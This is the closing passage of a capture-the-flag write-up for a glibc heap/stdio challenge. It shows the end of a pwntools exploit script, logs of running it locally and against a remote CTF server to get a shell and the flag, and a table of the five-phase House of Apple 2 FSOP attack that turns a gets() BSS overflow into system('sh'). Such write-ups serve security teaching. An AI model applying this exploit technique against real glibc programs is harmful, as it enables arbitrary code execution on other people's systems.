    payload2 += p64(_IO_wfile_jumps)       # +0xd8 vtable (valid, passes range check)
    payload2 += b"\x00" * 7 + b"\n"       # +0xe0 padding + newline terminates gets
    assert len(payload2) == 0xe8
    r.send(payload2)

    # Phase 5: main() returns → exit() → _IO_flush_all_lockp → system("  sh;")
    r.interactive()


if __name__ == "__main__":
    main()
```

---

## 15. Running the Exploit

### Local test

```bash
python3 solve.py LOCAL
# [*] Starting local process './bss-bof_patched'
# [*] libc base: 0x7f...
# [*] stdin:     0x7f...
# [*] stderr:    0x7f...
# [*] system:    0x7f...
# [*] _IO_wfile_jumps: 0x7f...
# [*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat /flag*.txt
tkbctf{...}
```

### Remote

```bash
# Edit PORT in solve.py to the provided port, then:
python3 solve.py
# [+] Opening connection to 34.170.146.252 on port XXXX: Done
# [*] libc base: 0x7f...
# [*] Switching to interactive mode
$ cat /flag*.txt
tkbctf{b0kug4_s4k1n1_so1v3r_w0_k4k1o3tan0n1}
```

---

## Summary

| Phase | Primitive | Target | Effect |
|-------|-----------|--------|--------|
| 1 | `printf` leak | libc GOT | Compute libc base |
| 2 | `read`/`read` arbitrary write | `stdin+0x38` | `_IO_buf_base` → `&stdin` |
| 3 | `gets` → underflow 1 | stdin struct (0x84 B) | Redirect buf to stderr |
| 4 | `gets` → underflow 2 | stderr struct (0xe8 B) | Forge House of Apple 2 FILE |
| 5 | `exit()` FSOP | `_IO_wfile_jumps` | `system("  sh;")` |

The elegant part of this challenge is that `gets(buf)` — targeting an 8-byte BSS buffer — ends up writing **two large payloads into libc BSS** through the stdio underflow mechanism. The BSS overflow never overflows into anything in the binary itself; instead it hijacks the stdio machinery to write exactly what we want, where we want it.
